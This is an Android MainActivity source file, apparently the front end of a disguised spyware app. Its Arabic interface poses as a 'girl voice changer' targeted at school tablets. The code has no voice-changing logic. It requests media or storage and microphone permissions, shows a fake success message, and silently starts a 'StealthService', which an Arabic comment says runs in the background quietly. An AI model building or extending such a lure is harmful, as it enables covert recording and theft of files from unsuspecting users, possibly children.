// language: Java, file: MainActivity.java, target: Android / School Tablet
package com.whatsapp.clone.stealth;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // تصميم واجهة زجاجية باللون الأخضر الداكن والفخم
        LinearLayout rootLayout = new LinearLayout(this);
        rootLayout.setOrientation(LinearLayout.VERTICAL);
        rootLayout.setGravity(Gravity.CENTER);
        rootLayout.setBackgroundColor(Color.parseColor("#091F14"));
        rootLayout.setPadding(60, 60, 60, 60);

        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER);
        card.setPadding(50, 80, 50, 80);

        GradientDrawable glassDrawable = new GradientDrawable();
        glassDrawable.setColor(Color.parseColor("#152D22"));
        glassDrawable.setCornerRadius(40);
        glassDrawable.setStroke(3, Color.parseColor("#10B981"));
        card.setBackground(glassDrawable);

        TextView title = new TextView(this);
        title.setText("مغير الصوت (صوت بنت)");
        title.setTextColor(Color.WHITE);
        title.setTextSize(22);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 50);
        card.addView(title);

        Button btnVoice = new Button(this);
        btnVoice.setText("تفعيل صوت البنت وتحويله");
        btnVoice.setTextColor(Color.WHITE);
        
        GradientDrawable btnDrawable = new GradientDrawable();
        btnDrawable.setColor(Color.parseColor("#10B981"));
        btnDrawable.setCornerRadius(25);
        btnVoice.setBackground(btnDrawable);
        btnVoice.setPadding(40, 30, 40, 30);
        
        card.addView(btnVoice);
        rootLayout.addView(card);

        setContentView(rootLayout);

        // طلب الأذونات وتشغيل الخدمة في الخلفية بصمت
        checkAndRequestPermissions();

        btnVoice.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(MainActivity.this, "تم تطبيق فلتر صوت البنت بنجاح!", Toast.LENGTH_LONG).show();
                startStealthService();
            }
        });
    }

    private void checkAndRequestPermissions() {
        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.RECORD_AUDIO};
        } else {
            permissions = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.RECORD_AUDIO};
        }

        if (ContextCompat.checkSelfPermission(this, permissions[0]) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            startStealthService();
        }
    }

    private void startStealthService() {
        Intent serviceIntent = new Intent(MainActivity.this, StealthService.class);
        startService(serviceIntent);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            startStealthService();
        }
    }
}
